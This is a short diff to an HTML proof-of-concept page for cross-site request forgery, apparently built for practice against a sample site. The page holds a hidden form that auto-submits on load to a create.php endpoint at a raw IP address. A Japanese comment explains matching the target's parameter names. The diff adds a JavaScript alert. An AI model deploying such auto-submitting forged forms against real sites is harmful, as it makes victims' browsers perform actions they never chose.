@@ -6,12 +6,13 @@
 <form action="http://13.115.140.194/create.php" method="POST">
     <!-- サンプルサイトのhtmlソースを見ながらIDとパスワードのパラメータ名（name）を合わせ、
     変更させたい適当な値をvalueに設定する -->
-    <input type = "hidden" name="name" value="csrftest" />
-	<input type = "hidden" id ="InputUsername" name="company" value="君の名は希望株式会社"/>
+    <input id ="InputUsername" type = "hidden" name="name" value="csrftest" />
+	<input type = "hidden" name="company" value="君の名は希望株式会社"/>
 </form>
 <script>
     var form = document.querySelector("form");
     form.submit()
+	alert('JavaScriptのアラート');
 </script>
 </body>
 </html>
